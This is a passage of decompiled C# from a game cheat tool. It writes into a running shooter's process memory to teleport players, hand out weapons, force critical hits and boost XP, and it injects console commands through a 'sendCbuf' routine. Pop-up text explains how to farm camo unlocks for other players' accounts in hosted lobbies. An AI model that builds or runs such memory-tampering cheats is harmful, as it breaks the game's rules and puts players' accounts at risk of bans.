		private void contextMenuStrip2_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000233 RID: 563 RVA: 0x0000E3D4 File Offset: 0x0000E3D4
		private void trackBar1_Scroll(object sender, EventArgs e)
		{
			this.label8.Text = this.trackBar1.Value.ToString() + "x";
		}

		// Token: 0x06000234 RID: 564 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton27_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000235 RID: 565 RVA: 0x0000E40C File Offset: 0x0000E40C
		private void thirteenButton26_Click(object sender, EventArgs e)
		{
			if (Main.<>o__154.<>p__0 == null)
			{
				Main.<>o__154.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__154.<>p__0.Target(Main.<>o__154.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteFloat(this.mem.BaseAddress + this.weapon, Convert.ToSingle(this.trackBar2.Value));
			}
		}

		// Token: 0x06000236 RID: 566 RVA: 0x0000E4A0 File Offset: 0x0000E4A0
		private void trackBar2_Scroll(object sender, EventArgs e)
		{
			this.label10.Text = this.trackBar2.Value.ToString() + "x";
		}

		// Token: 0x06000237 RID: 567 RVA: 0x0000E4D8 File Offset: 0x0000E4D8
		private void thirteenButton27_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__156.<>p__0 == null)
			{
				Main.<>o__156.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__156.<>p__0.Target(Main.<>o__156.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteFloat(this.mem.BaseAddress + this.xp - 8L, Convert.ToSingle(this.trackBar1.Value));
				this.mem.WriteFloat(this.mem.BaseAddress + this.xp, Convert.ToSingle(this.trackBar1.Value));
			}
		}

		// Token: 0x06000238 RID: 568 RVA: 0x0000E59C File Offset: 0x0000E59C
		private void thirteenButton28_Click(object sender, EventArgs e)
		{
			if (Main.<>o__158.<>p__0 == null)
			{
				Main.<>o__158.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__158.<>p__0.Target(Main.<>o__158.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.TeleportPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.TeleportPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.TeleportPos[2] = this.mem.ReadFloat(gclient + 3568L);
			}
		}

		// Token: 0x06000239 RID: 569 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton29_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600023A RID: 570 RVA: 0x0000E65C File Offset: 0x0000E65C
		private void teleportBox(float x, float y, float z)
		{
			if (Main.<>o__160.<>p__0 == null)
			{
				Main.<>o__160.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__160.<>p__0.Target(Main.<>o__160.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteFloat(gclient + 3560L, x);
					this.mem.WriteFloat(gclient + 3564L, y);
					this.mem.WriteFloat(gclient + 3568L, z);
				}
			}
		}

		// Token: 0x0600023B RID: 571 RVA: 0x0000E714 File Offset: 0x0000E714
		private void medicalBayToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = 696.2877f;
			this.boxPos[1] = 1861.023f;
			this.boxPos[2] = -287.875f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x0600023C RID: 572 RVA: 0x0000E768 File Offset: 0x0000E768
		private void spawnAreaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = 962.0594f;
			this.boxPos[1] = -29.83723f;
			this.boxPos[2] = 46.26712f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x0600023D RID: 573 RVA: 0x0000E7BC File Offset: 0x0000E7BC
		private void weaponsLabToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = -1536.847f;
			this.boxPos[1] = -43.63105f;
			this.boxPos[2] = -367.0538f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x0600023E RID: 574 RVA: 0x0000E810 File Offset: 0x0000E810
		private void brokenPlaneToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = 101.9625f;
			this.boxPos[1] = 2175.296f;
			this.boxPos[2] = 197.5166f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x0600023F RID: 575 RVA: 0x0000E864 File Offset: 0x0000E864
		private void underPackAPunchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = 368.6002f;
			this.boxPos[1] = -452.8454f;
			this.boxPos[2] = -671.875f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x06000240 RID: 576 RVA: 0x0000E8B8 File Offset: 0x0000E8B8
		private void swampyAreaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = -983.5432f;
			this.boxPos[1] = 353.1354f;
			this.boxPos[2] = -47.49364f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x06000241 RID: 577 RVA: 0x0000E90C File Offset: 0x0000E90C
		private void buildingGroundFloorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.boxPos[0] = -51.29785f;
			this.boxPos[1] = 751.2702f;
			this.boxPos[2] = 1.125f;
			this.teleportBox(this.boxPos[0], this.boxPos[1], this.boxPos[2]);
		}

		// Token: 0x06000242 RID: 578 RVA: 0x0000E960 File Offset: 0x0000E960
		private void giveWeapon(int weapon)
		{
			if (this.giveAll)
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 176L, Convert.ToInt32(weapon));
					this.mem.WriteInt(gclient + 240L, Convert.ToInt32(weapon));
				}
				return;
			}
			long gclient2 = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
			this.mem.WriteInt(gclient2 + 176L, Convert.ToInt32(weapon));
			this.mem.WriteInt(gclient2 + 240L, Convert.ToInt32(weapon));
		}

		// Token: 0x06000243 RID: 579 RVA: 0x00005140 File Offset: 0x00005140
		private void assaultRiflesToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000244 RID: 580 RVA: 0x0000EA10 File Offset: 0x0000EA10
		private void xM4ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(49);
		}

		// Token: 0x06000245 RID: 581 RVA: 0x0000EA1A File Offset: 0x0000EA1A
		private void aK47ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(5);
		}

		// Token: 0x06000246 RID: 582 RVA: 0x0000EA23 File Offset: 0x0000EA23
		private void krig6ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(11);
		}

		// Token: 0x06000247 RID: 583 RVA: 0x0000EA2D File Offset: 0x0000EA2D
		private void qBZToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(47);
		}

		// Token: 0x06000248 RID: 584 RVA: 0x0000EA37 File Offset: 0x0000EA37
		private void fFARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(26);
		}

		// Token: 0x06000249 RID: 585 RVA: 0x0000EA41 File Offset: 0x0000EA41
		private void grozaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(46);
		}

		// Token: 0x0600024A RID: 586 RVA: 0x0000EA4B File Offset: 0x0000EA4B
		private void milanoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(54);
		}

		// Token: 0x0600024B RID: 587 RVA: 0x0000EA55 File Offset: 0x0000EA55
		private void aK47uToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(41);
		}

		// Token: 0x0600024C RID: 588 RVA: 0x0000EA5F File Offset: 0x0000EA5F
		private void kSPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(17);
		}

		// Token: 0x0600024D RID: 589 RVA: 0x0000EA69 File Offset: 0x0000EA69
		private void bullfrogToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(14);
		}

		// Token: 0x0600024E RID: 590 RVA: 0x0000EA73 File Offset: 0x0000EA73
		private void mac10ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(43);
		}

		// Token: 0x0600024F RID: 591 RVA: 0x0000EA7D File Offset: 0x0000EA7D
		private void type63ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(32);
		}

		// Token: 0x06000250 RID: 592 RVA: 0x0000EA87 File Offset: 0x0000EA87
		private void dMR14ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(31);
		}

		// Token: 0x06000251 RID: 593 RVA: 0x0000EA91 File Offset: 0x0000EA91
		private void m16ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(35);
		}

		// Token: 0x06000252 RID: 594 RVA: 0x0000EA9B File Offset: 0x0000EA9B
		private void aUGToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(34);
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0000EAA5 File Offset: 0x0000EAA5
		private void stoner63ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(2);
		}

		// Token: 0x06000254 RID: 596 RVA: 0x0000EAAE File Offset: 0x0000EAAE
		private void m82ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(57);
		}

		// Token: 0x06000255 RID: 597 RVA: 0x0000EAB8 File Offset: 0x0000EAB8
		private void rPDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(44);
		}

		// Token: 0x06000256 RID: 598 RVA: 0x0000EAC2 File Offset: 0x0000EAC2
		private void pelingtonToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(28);
		}

		// Token: 0x06000257 RID: 599 RVA: 0x0000EACC File Offset: 0x0000EACC
		private void tundraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(45);
		}

		// Token: 0x06000258 RID: 600 RVA: 0x0000EAD6 File Offset: 0x0000EAD6
		private void m82ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.giveWeapon(4);
		}

		// Token: 0x06000259 RID: 601 RVA: 0x0000EADF File Offset: 0x0000EADF
		private void hauerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(33);
		}

		// Token: 0x0600025A RID: 602 RVA: 0x0000EAE9 File Offset: 0x0000EAE9
		private void galloToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(48);
		}

		// Token: 0x0600025B RID: 603 RVA: 0x0000EAF3 File Offset: 0x0000EAF3
		private void streetsweeperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(56);
		}

		// Token: 0x0600025C RID: 604 RVA: 0x0000EAFD File Offset: 0x0000EAFD
		private void toolStripMenuItem8_Click(object sender, EventArgs e)
		{
			this.giveWeapon(15);
		}

		// Token: 0x0600025D RID: 605 RVA: 0x0000EB07 File Offset: 0x0000EB07
		private void magnumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(19);
		}

		// Token: 0x0600025E RID: 606 RVA: 0x0000EB11 File Offset: 0x0000EB11
		private void diamattiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(25);
		}

		// Token: 0x0600025F RID: 607 RVA: 0x0000EB1B File Offset: 0x0000EB1B
		private void rPGToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(10);
		}

		// Token: 0x06000260 RID: 608 RVA: 0x0000EB25 File Offset: 0x0000EB25
		private void cigmaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(21);
		}

		// Token: 0x06000261 RID: 609 RVA: 0x0000EB2F File Offset: 0x0000EB2F
		private void knifeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(12);
		}

		// Token: 0x06000262 RID: 610 RVA: 0x0000EB39 File Offset: 0x0000EB39
		private void sledgehammerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(24);
		}

		// Token: 0x06000263 RID: 611 RVA: 0x0000EB43 File Offset: 0x0000EB43
		private void wakizashiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(27);
		}

		// Token: 0x06000264 RID: 612 RVA: 0x0000EB4D File Offset: 0x0000EB4D
		private void thumperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(8);
		}

		// Token: 0x06000265 RID: 613 RVA: 0x00005140 File Offset: 0x00005140
		private void weaponMenuToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000266 RID: 614 RVA: 0x0000EB56 File Offset: 0x0000EB56
		private void giveToAllONToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveAll = true;
		}

		// Token: 0x06000267 RID: 615 RVA: 0x0000EB5F File Offset: 0x0000EB5F
		private void giveToAllOFFToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveAll = false;
		}

		// Token: 0x06000268 RID: 616 RVA: 0x00005140 File Offset: 0x00005140
		private void ipGridView_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x06000269 RID: 617 RVA: 0x0000EB68 File Offset: 0x0000EB68
		private void thirteenButton29_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__207.<>p__0 == null)
			{
				Main.<>o__207.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(bool), typeof(Main)));
			}
			if (Main.<>o__207.<>p__0.Target(Main.<>o__207.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					this.GetGClient(i);
				}
			}
		}

		// Token: 0x0600026A RID: 618 RVA: 0x0000EBDB File Offset: 0x0000EBDB
		private void mP5ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.giveWeapon(250434592);
		}

		// Token: 0x0600026B RID: 619 RVA: 0x0000EBE8 File Offset: 0x0000EBE8
		private void Main_Load(object sender, EventArgs e)
		{
			Task.Run(delegate()
			{
				this.TimeUpdate();
			});
		}

		// Token: 0x0600026C RID: 620 RVA: 0x0000EBFC File Offset: 0x0000EBFC
		private void sendCbuf(string cmd)
		{
			if (Main.<>o__210.<>p__0 == null)
			{
				Main.<>o__210.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__210.<>p__0.Target(Main.<>o__210.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteString(this.mem.ReadInt64(this.mem.BaseAddress + this.cbufOffset), cmd);
				this.mem.WriteBool(this.mem.ReadInt64(this.mem.BaseAddress + this.cbufOffset) - 27L, true);
			}
		}

		// Token: 0x0600026D RID: 621 RVA: 0x0000ECBC File Offset: 0x0000ECBC
		private void checkBox7_CheckedChanged_1(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__211.<>p__0 == null)
			{
				Main.<>o__211.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__211.<>p__0.Target(Main.<>o__211.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox7.Checked)
				{
					this.sendCbuf("magic_chest_movable 0");
					return;
				}
				this.sendCbuf("magic_chest_movable 1");
			}
		}

		// Token: 0x0600026E RID: 622 RVA: 0x0000ED4C File Offset: 0x0000ED4C
		private void critCheck_CheckedChanged(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__212.<>p__0 == null)
			{
				Main.<>o__212.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__212.<>p__0.Target(Main.<>o__212.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.critCheck.Checked)
				{
					this.critTimer.Start();
					return;
				}
				this.critTimer.Stop();
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 4312L, 469762128);
				}
			}
		}

		// Token: 0x0600026F RID: 623 RVA: 0x0000EE08 File Offset: 0x0000EE08
		private void critTimer_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < 4; i++)
			{
				long gclient = this.GetGClient(i);
				this.mem.WriteInt(gclient + 4312L, -1);
			}
		}

		// Token: 0x06000270 RID: 624 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenTabControl1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000271 RID: 625 RVA: 0x0000EE3D File Offset: 0x0000EE3D
		private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("This will cycle weapons every 5 kills!!! If you skip over the 5th kill of a weapon, it wont switch till next time. So if you are hosting Dark Aether Lobbies, dont even use teleport zombies. Just have your clients run around and kills zombies 1 by one, and you will be perfect, should get DA first try.");
		}

		// Token: 0x06000272 RID: 626 RVA: 0x0000EE4C File Offset: 0x0000EE4C
		private void thirteenButton30_Click(object sender, EventArgs e)
		{
			if (Main.<>o__216.<>p__0 == null)
			{
				Main.<>o__216.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__216.<>p__0.Target(Main.<>o__216.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.TeleportPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.TeleportPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.TeleportPos[2] = this.mem.ReadFloat(gclient + 3568L);
			}
		}

		// Token: 0x06000273 RID: 627 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox9_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000274 RID: 628 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox10_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000275 RID: 629 RVA: 0x0000EF0C File Offset: 0x0000EF0C
		private void linkLabel2_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("1. Be sure yall have 0 kills.\n2. Set amount of kills you want for each weapon.\n3.Be sure you have God Mode and Infinite Ammo on in other tab.\n4.Set Teleport Location for Zombies and have them teleport to 1 spot.\n5. Also turn on 1 shot, crit kills, etc whatever you want just to set up the process.\n6. Aim at the pile of zombies turn on the farm and get to shootin. (Works best if you have a macro to auto shoot, or if using a controller wrap a rubber band around it or something.)");
		}

		// Token: 0x06000276 RID: 630 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox11_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000277 RID: 631 RVA: 0x0000EF1C File Offset: 0x0000EF1C
		private void checkBox8_CheckedChanged(object sender, EventArgs e)
		{
			if (Main.<>o__221.<>p__0 == null)
			{
				Main.<>o__221.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__221.<>p__0.Target(Main.<>o__221.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox8.Checked)
				{
					this.cycleTest.Start();
					return;
				}
				this.cycleTest.Stop();
			}
		}

		// Token: 0x06000278 RID: 632 RVA: 0x0000EFA8 File Offset: 0x0000EFA8
		private void giveWeapon2(string weapon, int client)
		{
			long gclient = this.GetGClient(client);
			this.mem.WriteInt(gclient + 176L, Convert.ToInt32(weapon));
			this.mem.WriteInt(gclient + 240L, Convert.ToInt32(weapon));
		}

		// Token: 0x06000279 RID: 633 RVA: 0x00005140 File Offset: 0x00005140
		private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x0600027A RID: 634 RVA: 0x0000EFF0 File Offset: 0x0000EFF0
		private void giveWeaponSolo(int weapon)
		{
			long gclient = this.GetGClient(0);
			this.mem.WriteInt(gclient + 176L, Convert.ToInt32(weapon));
			this.mem.WriteInt(gclient + 240L, Convert.ToInt32(weapon));
		}

		// Token: 0x0600027B RID: 635 RVA: 0x00005140 File Offset: 0x00005140
		private void soloFarm_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x0600027C RID: 636 RVA: 0x00005140 File Offset: 0x00005140
		private void acCheck_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600027D RID: 637 RVA: 0x00005140 File Offset: 0x00005140
		private void acFarm_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x0600027E RID: 638 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton11_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x0600027F RID: 639 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton24_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x06000280 RID: 640 RVA: 0x0000F038 File Offset: 0x0000F038
		private void thirteenButton29_Click_2(object sender, EventArgs e)
		{
			if (Main.<>o__231.<>p__0 == null)
			{
				Main.<>o__231.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__231.<>p__0.Target(Main.<>o__231.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				MessageBox.Show(this.mem.ReadInt(gclient + 4304L).ToString());
			}
		}

		// Token: 0x06000281 RID: 641 RVA: 0x0000F0C8 File Offset: 0x0000F0C8
		private void thirteenButton31_Click(object sender, EventArgs e)
		{
			if (Main.<>o__232.<>p__0 == null)
			{
				Main.<>o__232.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__232.<>p__0.Target(Main.<>o__232.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.DogPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.DogPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.DogPos[2] = this.mem.ReadFloat(gclient + 3568L);
			}
		}

		// Token: 0x06000282 RID: 642 RVA: 0x0000F188 File Offset: 0x0000F188
		private void camoLobbyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__233.<>p__0 == null)
			{
				Main.<>o__233.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Main.<>o__233.<>p__0.Target(Main.<>o__233.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName));
		}

		// Token: 0x06000283 RID: 643 RVA: 0x00005140 File Offset: 0x00005140
		private void allClientsToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000284 RID: 644 RVA: 0x00005140 File Offset: 0x00005140
		private void unnamedPlayerToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000285 RID: 645 RVA: 0x00005140 File Offset: 0x00005140
		private void unnamedPlayerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000286 RID: 646 RVA: 0x00005140 File Offset: 0x00005140
		private void unamedPlayerToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000287 RID: 647 RVA: 0x00005140 File Offset: 0x00005140
		private void unnamedPlayerToolStripMenuItem2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000288 RID: 648 RVA: 0x00005140 File Offset: 0x00005140
		private void individualPlayersToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000289 RID: 649 RVA: 0x0000F1F0 File Offset: 0x0000F1F0
		private void thirteenButton32_Click(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			Thread.Sleep(20);
			if (Main.<>o__257.<>p__0 == null)
			{
				Main.<>o__257.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__257.<>p__0.Target(Main.<>o__257.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.PointerCheck = true;
				string str = this.mem.ReadString(this.GetGClient(0) + this.namePTR);
				string str2 = this.mem.ReadString(this.GetGClient(1) + this.namePTR);
				string str3 = this.mem.ReadString(this.GetGClient(2) + this.namePTR);
				string str4 = this.mem.ReadString(this.GetGClient(3) + this.namePTR);
				this.label13.Text = "Name: " + str;
				this.label14.Text = "Name: " + str2;
				this.label15.Text = "Name: " + str3;
				this.label16.Text = "Name: " + str4;
			}
		}

		// Token: 0x0600028A RID: 650 RVA: 0x00005140 File Offset: 0x00005140
		private void getPointers2()
		{
		}

		// Token: 0x0600028B RID: 651 RVA: 0x00005140 File Offset: 0x00005140
		private void getPointers1()
		{
		}

		// Token: 0x0600028C RID: 652 RVA: 0x00005140 File Offset: 0x00005140
		private void getPointers3()
		{
		}

		// Token: 0x0600028D RID: 653 RVA: 0x00005140 File Offset: 0x00005140
		private void getPointers4()
		{
		}

		// Token: 0x0600028E RID: 654 RVA: 0x0000F32D File Offset: 0x0000F32D
		private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("Troubleshooting:\n----------------\n•MAKE SURE THAT EVERY MOD IS DISABLED WHEN YOU REFRESH PLAYERS AND ENABLE 1 KILL CAMOS FOR PEOPLE. YOU CAN TURN THE MODS ON AFTER YOU DO ALL THAT.\n•Guns not getting camos? Make sure when you join the game you already have the weapons unlocked. Also set the Gun XP Multiplier to 5000x.\n\n•Stuck on 1 weapons not getting gold? Simple, just pile up zombies and get 10 rapid kills twice and you should unlock gold after that.\n\n•Some of the weapons getting skipped in cycle weapons? Easy fix, just dont spawn the zombies in 1 spot. Turn on fast rounds and have your clients run around and kill the zombies individually. Be sure they dont skip the 5th kill for every weapon or else it will skip a weapon.\n\n•Did it work the first lobby but not the second? Restart your game completely and also have your clients do the same.\n\n•Not working at all? Be sure you refresh clients IN-GAME and wait a good second or 2 before you start giving it to people.\n\n•Still not working? Try this, when you get into your game. ONLY TURN ON GOD MODE, then refresh clients and start enabling the challenges for them.\n Still not working (This one helps for other clients) So the way it works is gold unlocks when you unlock 1 camo. So in order to unlock gold if you or someone already has some camos unlocked, just let them complete a challange they havent done yet for the gun and it should work. Whether that be rapid kills, rapid crits, elite kills. Anything should work.");
		}

		// Token: 0x0600028F RID: 655 RVA: 0x0000F33C File Offset: 0x0000F33C
		private void thirteenButton30_Click_1(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__440.<>p__0 == null)
			{
				Main.<>o__440.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__440.<>p__0.Target(Main.<>o__440.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
